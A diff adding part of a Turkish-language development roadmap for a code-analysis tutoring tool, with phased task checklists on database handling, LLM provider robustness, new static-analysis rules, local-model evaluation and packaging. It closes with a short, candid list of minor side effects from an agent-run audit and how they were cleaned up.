+- [ ] **O10:** bozuk/kilitli veritabanında hata diyaloğu + "yedekle ve sıfırla";
+      `report_callback_exception`
+- [ ] **O13:** dışa aktarma `OSError` kullanıcıya gösterilir
+- [ ] **O14:** temizlikten sonra `VACUUM` + `secure_delete`; son dosyalar listesi de temizlenir
+- [ ] **D19:** analiz sürerken tekil silme engellenir; WAL + `busy_timeout`; `user_version` ile
+      şema göçü (Sonraya: Faz 49 Ü9); eski oturumları budama (Sonraya: Faz 49)
+- [ ] Ctrl+S kaydetme; kaydedilmemiş değişiklik uyarısı
+- [ ] Geçmişte sayfalama ve arama (şu an son 50)
+- [ ] Kapanırken "analiz/indirme sürüyor" onayı
+- [ ] Keyring'deki eski OpenAI/DeepSeek anahtarlarını temizleme (Sonraya: Faz 37)
+- [ ] Kurulu zig sürümü eskiyse "güncelle" önerisi (Sonraya: Faz 29)
+- [ ] Bağlantılar'da `ollama pull` düğmesi (Sonraya: Faz 15)
+- [ ] SQLite çağrılarını iş parçacığına alma (Sonraya: Faz 26)
+- [ ] **400 satır:** `desktop/app.py` (494) ve `pipeline/orchestrator.py` (415) bölünür
+- [ ] Linux/macOS'ta "Oturum aç" (şu an yalnız Windows)
+
+---
+
+### Faz G — Sağlayıcı sağlamlığı ve kod temizliği (öncelik: orta-düşük)
+
+**Dal:** `faz/g-saglayici`
+
+- [ ] **O5:** CLI ajanları için config'den çıktı sınırı (`ProcessLimits.output_limit`)
+- [ ] **O6:** kalıcı CLI hataları yeniden denenmez
+- [ ] **D1-D12:** onarım prompt etiketi, `extract_json` tırnak hatası, `RecursionError`, çıplak
+      `429`/`401`, `finding_id` yeniden numaralama, geçiş başına sağlayıcı/maliyet, sızıntı sonrası
+      yeniden üretim notu, bozuk few-shot zarif bozulma, ölü kod ve test kancası,
+      `LLMMarkupAnalysisOutput` şeması, olay döngüsündeki küçük G/Ç, `_json_document` doğrusal
+- [ ] **D18:** Tier 0 durdurma tanısı yapısal bayrakla
+- [ ] **D20:** `buildinfo.py` logger; `--help` dil tutarlılığı; `eval run --language` enum;
+      exe'den FastAPI/uvicorn çıkarılır; `[desktop]` extra
+- [ ] `ProviderResult`'a "şema zorlandı mı" yeteneği; `SchemaAdapter` kısıtlarını sağlayıcıya göre
+      ayırma (Sonraya: Faz 7, 25)
+- [ ] Token tahmininin gerçek `usage` ile kalibrasyonu (Sonraya: Faz 8)
+
+---
+
+### Faz H — Statik kurallar ve analiz doğruluğu (öncelik: orta-düşük)
+
+**Dal:** `faz/h-kurallar`
+
+**Yeni kurallar** (her biri pozitif/negatif fixture ve katalog satırıyla):
+- [ ] CSS (3 kural, en zayıf dil): `outline:none` + focus göstergesi yok, sabit `px` yükseklik
+      taşması, `position:absolute` + margin ile ortalama
+- [ ] C++: döngüde `std::string +`/`+=` karesel, döngüde `std::endl`, `reserve` olmadan
+      döngüde `push_back`
+- [ ] C: genişlik sınırı olmayan `scanf("%s")`
+- [ ] C#: döngüde `string +=`
+
+**Bilinen kaçırmalar ve yanlış pozitifler** (Sonraya'dan):
+- [ ] CPP-OWN-001 erken `return`/istisna yolunda atlanan `delete`
+- [ ] C-MEM-001 aynı dosyadaki kullanıcı fonksiyonuna geçirilen işaretçi
+- [ ] UNITY-GC-001 kullanıcı `struct`'ı için `new` yanlış bulgusu
+- [ ] UE-GC-001 `TArray<AActor*>`/`TMap<…, UObject*>` alanları; UCLASS olmayan sınıfta doğru öneri
+- [ ] CS-PERF-001 `IList`/`IReadOnlyList`/`ICollection`
+- [ ] Sıcak yol tespiti sınıf tabanını (MonoBehaviour/UCLASS) denetler
+- [ ] Kural bazında öneri türü (Faz 36 açık maddesi)
+- [ ] `call_costs.yaml`: `memset`/`memcpy`, `GetAllActorsOfClass`, `TArray::Remove`, C#
+      `RemoveAll`/`RemoveAt(0)`/`Insert(0,…)`
+- [ ] `parse_bigo`: `log log n`, `Θ/Ω`, `max(n,m)`, değişken üsler
+- [ ] Maskeleme: C# 11 raw string; `mask_non_code`'a dil bilgisi
+- [ ] Unreal stub genişletme (`FMath`, `FHitResult`, dinamik delegeler, `GetWorldTimerManager`…)
+- [ ] Include koruması: `#pragma MACRO` / `#line` izin listesi
+- [ ] gcc/clang/Tier 0 kolon birimi uyumu (`-fdiagnostics-column-unit=byte`)
+- [ ] HTML-STD-003: adoption agency, foster parenting (bilinen sınır; değerlendirme)
+- [ ] Statik dev eval yeniden koşulur; README kural sayısı güncellenir
+
+---
+
+### Faz I — Yerel modeller ve eval (eski Faz 64-66; öncelik: düşük)
+
+**Dal:** `faz/i-yerel-modeller` · Ayrıntı: [GUNCELLEMELER.md](GUNCELLEMELER.md) Faz 64-66
+
+**Not:** kullanıcı tercihi gereği canlı denemeler `claude_cli` ile yapılır; Ollama ölçümü
+başlamadan önce kullanıcıya sorulur.
+
+- [ ] **Ölçüm tabanı (eski 64):** yerel modellerle dev alt kümesi; soru tekrar oranı, koda
+      değmeyen soru oranı, yanlış bulgu oranı, Big-O çelişkisi, gecikme; README'de ayrı tablo
+- [ ] **Kalite korumaları (eski 65):** deterministik Sokratik kalite kapısı (tekrar, döngü,
+      koda değme), karmaşıklık politikası, bulgu sağduyu denetimi, model profili
+      (`small`/`standard`), isteğe bağlı `pipeline.verify_provider`
+- [ ] **Hız (eski 66):** `keep_alive`, `num_ctx`, akış ile ilerleme, makineye göre model önerisi
+
+**Eval altyapısı** (Sonraya'dan):
+- [ ] `RunConfig`'e etiket/veri seti özeti; `compare` dipnotu
+- [ ] `select_part` parça atamasını kimlik özetiyle sabitleme
+- [ ] `eval breakdown`'a gecikme/token sütunları
+- [ ] HTML precision için bulgu ölçütü ve kategori tanımları (yalnız dev'de)
+- [ ] Few-shot'lara `certainty`; Python few-shot örnekleri
+- [ ] LLM-as-judge ile Sokratik kalite puanı (README yol haritası)
+
+---
+
+### Faz J — Açık kalan diğer işler (havuz)
+
+Faz A-I'ya girmeyen, ihtiyaç doğunca ele alınacak maddeler:
+
+- [ ] İmzalı exe + Inno Setup kurulum paketi (SmartScreen)
+- [ ] Onefile exe'de gömülü `RoslynCheck.exe`'nin `%TEMP%`'e açılması (AppLocker/antivirüs)
+- [ ] İndirilen zig'den gereksiz libc başlıklarını budama (382 MB → <150 MB)
+- [ ] Tier 0 yalıtımında sıcak işçi havuzu (~280 ms süreç açma)
+- [ ] CI Windows: MinGW g++ soğuk başlangıç süresi; clang için `--target=x86_64-w64-mingw32`
+- [ ] Soru bankası: öğretmen içerik incelemesi, örnek giriş/çıkış alanı, `METHOD_LEAKS`'i soru
+      verisine taşıma, kontrol listesi anlık görüntü testi
+- [ ] Faz 18 etiket kararı (`c-008`, `csharp-009` için Faz 17 bulguları; kullanıcı kararı)
+- [ ] OpenAI katı mod kısıtlarının canlı doğrulanması (sağlayıcı geri gelirse)
+- [ ] JS (tarayıcı) desteği; cppcheck/clang-tidy entegrasyonu; VS Code eklentisi; Rust/Go
+      (README yol haritası v1.1/v2.0)
+- [ ] `session_id`'yi kimlik/anahtara bağlama (paylaşılan sunucu, D16)
+
+---
+
+## 11. Tarama sırasındaki yan etkiler
+
+- İki ajan birer kez yanlışlıkla gerçek bir `claude_cli` çağrısı yaptı (önemsiz kodla:
+  `int main(){return 0;}` ve bir test girdisi).
+- Bir ajan Git Bash yol dönüşümü yüzünden `C:\c\Users\...\scratchpad\afile\sub\db.sqlite` oluşturdu;
+  silindi.
+- Ajanların `%TEMP%\claude_probe*.py` deneme betikleri silindi.
+- Arkada çalışan süreç kalmadı (kontrol edildi). Repoda hiçbir dosya değişmedi (bu belge hariç).
